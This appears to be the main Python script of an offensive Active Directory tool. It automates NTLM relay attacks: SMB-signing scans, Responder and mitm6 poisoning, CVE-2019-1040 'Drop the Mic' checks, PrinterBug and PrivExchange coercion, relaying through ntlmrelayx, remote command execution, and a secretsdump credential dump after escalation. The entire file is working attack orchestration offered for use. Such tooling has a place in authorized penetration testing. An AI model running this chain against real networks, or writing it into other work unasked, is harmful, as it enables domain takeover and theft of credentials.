#!/usr/bin/env python3

import asyncio
import argparse
import sys
from src.utils import *
from src.tools import *
from src.smb import get_unsigned_hosts
from netaddr import IPNetwork, AddrFormatError

def parse_args(args):
    # Create the arguments
    parser = argparse.ArgumentParser(args)
    parser.add_argument("-l", "--hostlist", help="Host list file")
    parser.add_argument("-i", "--interface", help="Interface to use with Responder")
    parser.add_argument("-c", "--command", help="Remote command to run upon successful NTLM relay")
    parser.add_argument("-6", "--mitm6", action='store_true', help="Run mitm6 in conjunction with the relay attack")
    parser.add_argument("-d", "--domain", help="Domain for mitm6 to attack")
    parser.add_argument("-tf", "--target-file", help="Target file for ntlmrelayx to relay to")
    parser.add_argument("-u", "--user", help="Creds for PrivExchange: DOMAIN/user:password")
    parser.add_argument("-sf", "--server-file", help="Newline separated file of IPs which will be attacked via PrinterBug")
    parser.add_argument("-s", "--server", help="Server which will be attacked via PrinterBug")
    parser.add_argument("-dc", "--domain-controller",
                        help="Domain controller for Drop the Mic and PrivExchange attacks")
    parser.add_argument("--privexchange", action="store_true", help="Perform PrivExchange attack")
    parser.add_argument("--remove-mic", action="store_true", help="Perform Drop the Mic attack")
    parser.add_argument("--httpattack", action="store_true", help="Perform PrivExchange without authentication")
    parser.add_argument("--delegate", action="store_true", help="Perform relay delegation attack with mitm6")
    parser.add_argument("--delegate-dc", action="store_true",
                        help="Perform relay delegation attack against domain controller")
    return parser.parse_args(args)

def parse_hostlist(hostlist):
    """
    Parse the hostlist argument

    Mandatory arguments:
    - hostlist : file with list of IPs or CIDR notation blocks
    """
    hosts = []
    with open(hostlist, 'r') as f:
        host_lines = f.readlines()
        for line in host_lines:
            line = line.strip()
            try:
                if '/' in line:
                    hosts += [str(ip) for ip in IPNetwork(line)]
                elif '*' in line:
                    print_bad('CIDR notation only in the host list, e.g. 10.0.0.0/24')
                else:
                    hosts.append(line)
            except (OSError, AddrFormatError):
                print_bad('Error importing host list file. Are you sure you chose the right file?')

    return hosts

def parse_mic_scan(proc):
    hosts = []
    for l in proc.stdout:
        if "is VULNERABLE" in l:
            host = l.split()[2].strip()
            hosts.append(host)
    return hosts

def user_attacks(args, local_ip):
    printerbug = None
    privexchange = None
    scan = None

    # PrinterBug
    if args.remove_mic or args.delegate_dc:
        print_info("Testing servers for CVE-2019-1040 (Drop the Mic)")
        scan = start_mic_scan(args)
        vuln_hosts = parse_mic_scan(scan)

        if len(vuln_hosts) > 0:
            server = vuln_hosts[0]
            printerbug = start_printerbug(args, server, local_ip)

            return printerbug, privexchange, scan

        else:
            print_bad("No servers found vulnerable to Drop the Mic")
            sys.exit()

    # PrivExchange
    elif args.privexchange:
        privexchange = start_privexchange(args, local_ip)

    return printerbug, privexchange, scan

async def relay_attacks(args, iface):
    mitm6 = None
    responder = None

    # Scan hostlist for lack of SMB signing
    if args.hostlist:
        hostlist = args.hostlist
        hosts = parse_hostlist(hostlist)
        print_info("Checking for unsigned SMB hosts")
        unsigned_hosts = await get_unsigned_hosts(loop, hosts)

        if len(unsigned_hosts) == 0:
            print_bad('No hosts with SMB signing disabled found, NTLM relaying will fail')

        else:
            print_good('Unsigned SMB hosts:')
            for h in unsigned_hosts:
                print_good('  ' + h)

    # Start Responder
    if not args.delegate:
        conf = os.getcwd() + '/tools/Responder/Responder.conf'
        responder = start_responder(iface, conf)

    # Start mitm6
    if args.mitm6 or args.delegate:
        mitm6 = start_mitm6(args)

    return responder, mitm6

def check_args(args):
    msg = None

    if args.privexchange or args.remove_mic:
        if not any([args.server, args.server_file]) or not args.user or not args.domain_controller:
            msg = ("PrivExchange and PrinterBug attacks require: -s <server to attack> "
                      "-u <DOM/user:password> -dc <domain controller IP/hostname>")

    elif args.httpattack:
        if not args.server:
            msg = ("Passwordless PrivExchange attack requires: -s <exchange server>")

    elif args.delegate:
        if not args.domain_controller:
            msg = ("Delegation attack requires: -dc <domain controller>")

    elif args.delegate_dc:
        if not args.server or not args.user or not args.domain_controller:
            msg = ("DC delegation attack requires: -dc <domain controller> -s <second domain controller -u DOM/user:password")

    elif not args.hostlist and not args.target_file:
        msg = ("Missing arguments check README.md for examples; minimum arguments are either -l <hostlist.txt> or "
                  "-tf <targets_file.txt> for simple SMB relay attack")

    if msg:
        print_bad(msg)
        sys.exit()

def cleanup(procs):
    """
    Catch CTRL-C and kill procs
    """
    cwd = os.getcwd()
    slow_msg = ''

    for p in procs:
        # printerbug_scanner and secretsdump are supposed to be dead after running
        # But why does ntlmrelayx exit before we call .kill() on it?
        # Something to do with the file object we open and close in stdout?
        if p:
            if p.name not in ['printerbug_scanner', 'secretsdump', 'ntlmrelayx']:

                if p.name == 'mitm6':
                    slow_msg = ', this may take a minute'

                print_info(f'Killing {p.name}{slow_msg}')

                if p.name == 'responder':
                    print_info('Reverting Responder.conf')
                    switch = 'On'
                    protocols = ['HTTP', 'SMB']
                    conf = os.getcwd() + '/tools/Responder/Responder.conf'
                    edit_responder_conf(switch, protocols, conf)

                try:
                    p.kill()
                except ProcessLookupError:
                    print_info(f'{p.name} already dead may have errored on start, check autorelayx/logs/{p.name}.log files')

    try:
        os.remove(f'{cwd}/arp.cache')
    except FileNotFoundError:
        pass

    time.sleep(3)

async def main():
    check_args(args)
    procs = []

    try:
        iface, local_ip = get_iface_and_ip(args)
    except Exception as e:
        print_bad(str(e))
        sys.exit()

    if any([args.privexchange, args.remove_mic, args.delegate_dc]):
        printerbug, privexchange, scan = user_attacks(args, local_ip)
        procs.append(printerbug)
        procs.append(privexchange)
        procs.append(scan)

    elif any([args.hostlist, args.target_file, args.httpattack, args.mitm6, args.delegate]):
        responder, mitm6 = await relay_attacks(args, iface)
        procs.append(responder)
        procs.append(mitm6)

    # Start ntlmrelayx
    ntlmrelayx = start_ntlmrelayx(args)
    procs.insert(0, ntlmrelayx)

    # PrivExchange/PrinterBug successful, run secretsdump
    if ntlmrelayx.escalation_successful == True:
        secretsdump = start_secretsdump(args)
        procs.append(secretsdump)

    print_info('Cleaning up and closing')
    cleanup(procs)
    print_good('Done')

if __name__ == "__main__":

    if os.geteuid():
        print_bad('Run as root')
        sys.exit()

    args = parse_args(sys.argv[1:])
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
    loop.close()